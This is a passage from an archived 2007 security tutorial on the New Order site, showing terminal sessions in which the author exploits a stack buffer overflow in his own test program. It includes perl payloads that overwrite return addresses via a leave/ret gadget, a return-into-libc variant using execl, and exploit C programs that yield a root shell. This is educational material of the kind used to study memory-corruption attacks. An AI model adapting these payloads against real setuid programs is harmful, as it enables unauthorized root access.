&nbsp;&nbsp;%eax<br/>0x8048347&nbsp;&lt;main+31&gt;:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x8048268&nbsp;&lt;strcpy&gt;<br/>0x804834c&nbsp;&lt;main+36&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x10,%esp<br/>0x804834f&nbsp;&lt;main+39&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x0,%eax<br/>0x8048354&nbsp;&lt;main+44&gt;:&nbsp;&nbsp;&nbsp;&nbsp;leave&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;leaveret:&nbsp;0x8048354<br/>0x8048355&nbsp;&lt;main+45&gt;:&nbsp;&nbsp;&nbsp;&nbsp;ret<br/>0x8048356&nbsp;&lt;main+46&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop<br/>0x8048357&nbsp;&lt;main+47&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop<br/>End&nbsp;of&nbsp;assembler&nbsp;dump.<br/>(gdb)&nbsp;q<br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul2&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"a"x28,"\x01\xf2\xff\xbf","\x54\x83\x04\x08"'`<br/>sh-2.05b#&nbsp;<br/>sh-2.05b#&nbsp;exit<br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul2&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"a"x28,"\x08\xf9\xff\xbf","\x54\x83\x04\x08"'`<br/>sh-2.05b#<br/><br/>Wow!&nbsp;I&nbsp;got&nbsp;a&nbsp;root&nbsp;shell.&nbsp;We&nbsp;can&nbsp;also&nbsp;use&nbsp;the&nbsp;address&nbsp;which&nbsp;we&nbsp;get&nbsp;after&nbsp;executing&nbsp;eggshell&nbsp;program.&nbsp;<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul2&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"\xd8\xf8\xff\xbf"x7,"\x08\xf9\xff\xbf","\x54\x83\x04\x08"'`<br/>sh-2.05b#<br/><br/><br/><br/><br/>3.4.&nbsp;Way&nbsp;of&nbsp;Using&nbsp;execl()<br/><br/>I&nbsp;included&nbsp;and&nbsp;explained&nbsp;about&nbsp;this&nbsp;technique&nbsp;in&nbsp;my&nbsp;last&nbsp;post&nbsp;"return-into-libc&nbsp;test"&nbsp;to&nbsp;Neworder(http://neworder.box.sk/newsread.php?newsid=11535).&nbsp;So,&nbsp;I&nbsp;don't&nbsp;explain&nbsp;about&nbsp;this&nbsp;technique&nbsp;this&nbsp;time.&nbsp;I&nbsp;just&nbsp;include&nbsp;the&nbsp;test&nbsp;result.&nbsp;If&nbsp;you&nbsp;want&nbsp;to&nbsp;know&nbsp;about&nbsp;this,&nbsp;see&nbsp;my&nbsp;last&nbsp;post.&nbsp;Sorry^^.<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;cat&nbsp;&gt;&nbsp;execl.c<br/>main()<br/>{<br/>&nbsp;&nbsp;&nbsp;&nbsp;execl();<br/>}<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gcc&nbsp;-o&nbsp;execl&nbsp;execl.c<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;execl<br/>(gdb)&nbsp;b&nbsp;main<br/>Breakpoint&nbsp;1&nbsp;at&nbsp;0x804832e<br/>(gdb)&nbsp;r<br/>Starting&nbsp;program:&nbsp;/home/vangelis/test/bof/execl<br/>/bin/bash:&nbsp;/root/.bashrc:&nbsp;Permission&nbsp;denied<br/><br/>Breakpoint&nbsp;1,&nbsp;0x0804832e&nbsp;in&nbsp;main&nbsp;()<br/>(gdb)&nbsp;p&nbsp;execl<br/>$1&nbsp;=&nbsp;{&lt;text&nbsp;variable,&nbsp;no&nbsp;debug&nbsp;info&gt;}&nbsp;0x420ae890&nbsp;&lt;execl&gt;<br/>(gdb)&nbsp;q<br/>The&nbsp;program&nbsp;is&nbsp;running.&nbsp;&nbsp;Exit&nbsp;anyway?&nbsp;(y&nbsp;or&nbsp;n)&nbsp;y<br/>[vangelis@localhost&nbsp;bof]$&nbsp;cat&nbsp;&gt;&nbsp;setid.c<br/>main()<br/>{<br/>&nbsp;&nbsp;&nbsp;&nbsp;setreuid(geteuid(),geteuid());<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setregid(getegid(),getegid());<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;execl("/bin/bash",&nbsp;"sh",&nbsp;0);<br/>}<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gcc&nbsp;-o&nbsp;setid&nbsp;setid.c<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;setid<br/>(gdb)&nbsp;b&nbsp;main<br/>Breakpoint&nbsp;1&nbsp;at&nbsp;0x8048406<br/>(gdb)&nbsp;r<br/>Starting&nbsp;program:&nbsp;/home/vangelis/test/bof/setid<br/>/bin/bash:&nbsp;/root/.bashrc:&nbsp;Permission&nbsp;denied<br/><br/>Breakpoint&nbsp;1,&nbsp;0x08048406&nbsp;in&nbsp;main&nbsp;()<br/>(gdb)&nbsp;x/30s&nbsp;0xbffffd4b<br/>0xbffffd4b:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"PVM_ROOT=/usr/share/pvm3"<br/>0xbffffd64:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"SSH_AUTH_SOCK=/tmp/ssh-XXCipL12/agent.896"<br/>0xbffffd8e:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"SESSION_MANAGER=local/localhost.localdomain:/tmp/.ICE-unix/896"<br/>0xbffffdcd:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"USERNAME=root"<br/>0xbffffddb:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"MAIL=/var/spool/mail/root"<br/>0xbffffdf5:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin"<br/>0xbffffe50:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"_=/bin/bash"<br/>0xbffffe5c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"INPUTRC=/etc/inputrc"<br/>0xbffffe71:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"PWD=/home/vangelis/test/bof"<br/>0xbffffe8d:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"XMODIFIERS=@im=Ami"<br/>0xbffffea0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"LANG=ko_KR.eucKR"<br/>0xbffffeb1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"GDMSESSION=Default"<br/>0xbffffec4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"SSH_ASKPASS=/usr/libexec/openssh/gnome-ssh-askpass"<br/>0xbffffef7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"HOME=/home/vangelis"<br/>0xbfffff0b:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"SHLVL=7"<br/>0xbfffff13:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"GNOME_DESKTOP_SESSION_ID=Default"<br/>0xbfffff34:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"BASH_ENV=/root/.bashrc"<br/>0xbfffff4b:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"LOGNAME=vangelis"<br/>0xbfffff5c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"LESSOPEN=|/usr/bin/lesspipe.sh&nbsp;%s"<br/>0xbfffff7e:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"DISPLAY=:0"<br/>0xbfffff89:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"G_BROKEN_FILENAMES=1"<br/>0xbfffff9e:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"COLORTERM=gnome-terminal"<br/>0xbfffffb7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"XAUTHORITY=/home/vangelis/.xauthsvjSKd"<br/>0xbfffffde:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"/home/vangelis/test/bof/setid"<br/>0xbffffffc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;""<br/>0xbffffffd:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;""<br/>0xbffffffe:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;""<br/>0xbfffffff:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;""<br/>(gdb)&nbsp;q<br/>The&nbsp;program&nbsp;is&nbsp;running.&nbsp;&nbsp;Exit&nbsp;anyway?&nbsp;(y&nbsp;or&nbsp;n)&nbsp;y<br/>[vangelis@localhost&nbsp;bof]$&nbsp;cat&nbsp;&gt;&nbsp;exploit.c<br/>#include&nbsp;&lt;unistd.h&gt;<br/><br/>int&nbsp;main()<br/>{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*path&nbsp;=&nbsp;"/home/vangelis/test/bof/vul2";<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*argv[]&nbsp;=&nbsp;{&nbsp;"./setid",&nbsp;"AAAABBBBCCCCDDDDEEEEFFFF\xde\xff\xff\xbf\x93\xe8<br/><br/><br/>\x0a\x42",&nbsp;0&nbsp;};<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;execve(path,&nbsp;argv,&nbsp;0);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br/>}<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gcc&nbsp;-o&nbsp;exploit&nbsp;exploit.c<br/>[vangelis@localhost&nbsp;bof]$&nbsp;./exploit<br/>Segmentation&nbsp;fault<br/>[vangelis@localhost&nbsp;bof]$<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;exploit<br/>(gdb)&nbsp;r<br/>Starting&nbsp;program:&nbsp;/home/vangelis/test/bof/exploit<br/>/bin/bash:&nbsp;/root/.bashrc:&nbsp;Permission&nbsp;denied<br/><br/>Program&nbsp;received&nbsp;signal&nbsp;SIGTRAP,&nbsp;Trace/breakpoint&nbsp;trap.<br/>0x40000b30&nbsp;in&nbsp;_start&nbsp;()&nbsp;from&nbsp;/lib/ld-linux.so.2<br/>(gdb)&nbsp;sysmol-file&nbsp;/home/vangelis/test/bof/exploit<br/>Undefined&nbsp;command:&nbsp;"sysmol-file".&nbsp;&nbsp;Try&nbsp;"help".<br/>(gdb)&nbsp;symbol-file&nbsp;/home/vangelis/test/bof/exploit<br/>Load&nbsp;new&nbsp;symbol&nbsp;table&nbsp;from&nbsp;"/home/vangelis/test/bof/exploit"?&nbsp;(y&nbsp;or&nbsp;n)&nbsp;y<br/><br/>Reading&nbsp;symbols&nbsp;from&nbsp;/home/vangelis/test/bof/exploit...done.<br/>(gdb)&nbsp;b&nbsp;main<br/>Breakpoint&nbsp;1&nbsp;at&nbsp;0x804832e<br/>(gdb)&nbsp;c<br/>Continuing.<br/><br/>Breakpoint&nbsp;1,&nbsp;0x0804832e&nbsp;in&nbsp;main&nbsp;()<br/>(gdb)&nbsp;x/10wx&nbsp;$ebp<br/>0xbffffed8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffef8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x420158d4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbfffff24<br/>0xbffffee8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbfffff30&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x400124b8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048278<br/>0xbffffef8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x08048299<br/>(gdb)&nbsp;x/10wx&nbsp;0xbfffff24<br/>0xbfffff24:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbfffffb7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbfffffbf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000<br/>0xbfffff34:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000010&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0183f9ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000006&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00001000<br/>0xbfffff44:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000011&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000064<br/>(gdb)&nbsp;x/s&nbsp;0xbfffffb7<br/>0xbfffffb7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"./setid"<br/>(gdb)&nbsp;x/s&nbsp;0xbfffffbf<br/>0xbfffffbf:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"AAAABBBBCCCCDDDDEEEEFFFF????\223?\nB"<br/>(gdb)&nbsp;q<br/>The&nbsp;program&nbsp;is&nbsp;running.&nbsp;&nbsp;Exit&nbsp;anyway?&nbsp;(y&nbsp;or&nbsp;n)&nbsp;y<br/>[vangelis@localhost&nbsp;bof]$&nbsp;cat&nbsp;&gt;&nbsp;exploit2.c<br/>#include&nbsp;&lt;unistd.h&gt;<br/><br/>int&nbsp;main()<br/>{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*path&nbsp;=&nbsp;"/home/vangelis/test/bof/vul2";<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*argv[]&nbsp;=&nbsp;{&nbsp;"./setid",&nbsp;"AAAABBBBCCCCDDDDEEEEFFFF\x1c\xff\xff\xbf\x93\xe8<br/><br/>\x0a\x42",&nbsp;0&nbsp;};<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;execve(path,&nbsp;argv,&nbsp;0);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br/>}<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gcc&nbsp;-o&nbsp;exploit2&nbsp;exploit2.c<br/>[vangelis@localhost&nbsp;bof]$&nbsp;./exploit2<br/>sh-2.05b#<br/><br/><br/><br/><br/><br/><br/>I&nbsp;wish&nbsp;you&nbsp;all&nbsp;enjoy&nbsp;reading&nbsp;this&nbsp;article.&nbsp;<br/>If&nbsp;there&nbsp;are&nbsp;any&nbsp;mistakes&nbsp;or&nbsp;problems,&nbsp;mail&nbsp;to&nbsp;me.

</code><br/>  <br/>  <br/>  </span><p class="edgemenu"><p class="edgemenu"><a href="/web/20070818115455/http://www.neworder.box.sk/forum.php?did=edge12476">read comments</a> (23) /
		<a href="/web/20070818115455/http://www.neworder.box.sk/forum.newtopic.php?did=edge12476">write comment</a></p><span class="edgemenu">views: 19541 &nbsp;&nbsp;<a href="/web/20070818115455/http://www.neworder.box.sk/print/12476">printer-friendly version</a></span></td></tr></table></td></tr></table><p class="edgesmall"><p align="right"><a href="#top">Top of page</a></p>
  </td>
	
   </tr>
 </table>
</div>
<div id="footer">
	<a href="https://web.archive.org/web/20070818115455/http://edge.dev.box.sk/">powered by<br/><img src="/web/20070818115455im_/http://www.neworder.box.sk/imgsystem/edge1munkt0n.jpg" border="0"/></a><br/> 
	The content, logo and design of this site is &copy; 2007 by particular authors, 
	the New Order team and <a href="https://web.archive.org/web/20070818115455/http://www.boxnetwork.net/">Box Network ltd</a>.<br/> 
	For more information about New Order contact <a href="https://web.archive.org/web/20070818115455/mailto:Marek@boxnetwork.net">Marek</a><br>
	The <a href="https://web.archive.org/web/20070818115455/http://www.boxnetwork.net/docs/privacy.html"> privacy policy</a> statement for 
	<a href="https://web.archive.org/web/20070818115455/http://www.boxnetwork.net/">Box Network</a>.
<center>
<p>
<!-- NAJ.SK -->

<script src="https://web.archive.org/web/20070818115455js_/http://p1.naj.sk/code?site=32146;t=o88" type="text/javascript"></script><noscript><div><a href="https://web.archive.org/web/20070818115455/http://naj.sk/"><img src="https://web.archive.org/web/20070818115455im_/http://p1.naj.sk/hit?site=32146;t=o88;ref=;jss=0" width="88" height="31" alt="NAJ.sk" style="border:none"/></a></div></noscript>

<!-- /NAJ.SK -->
</center>

</div>
<!--running time: 2.69333410263 seconds---><!--boddy time: 2.5579419136 seconds---><!--header/footer time: 0.135392189026 seconds--->
</body>

</html>         


<!--
     FILE ARCHIVED ON 11:54:55 Aug 18, 2007 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 22:21:15 Aug 19, 2025.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 1.068
  exclusion.robots: 0.056
  exclusion.robots.policy: 0.034
  esindex: 0.015
  cdx.remote: 68.245
  LoadShardBlock: 318.311 (3)
  PetaboxLoader3.datanode: 113.506 (4)
  PetaboxLoader3.resolve: 201.212 (2)
  load_resource: 185.743
-->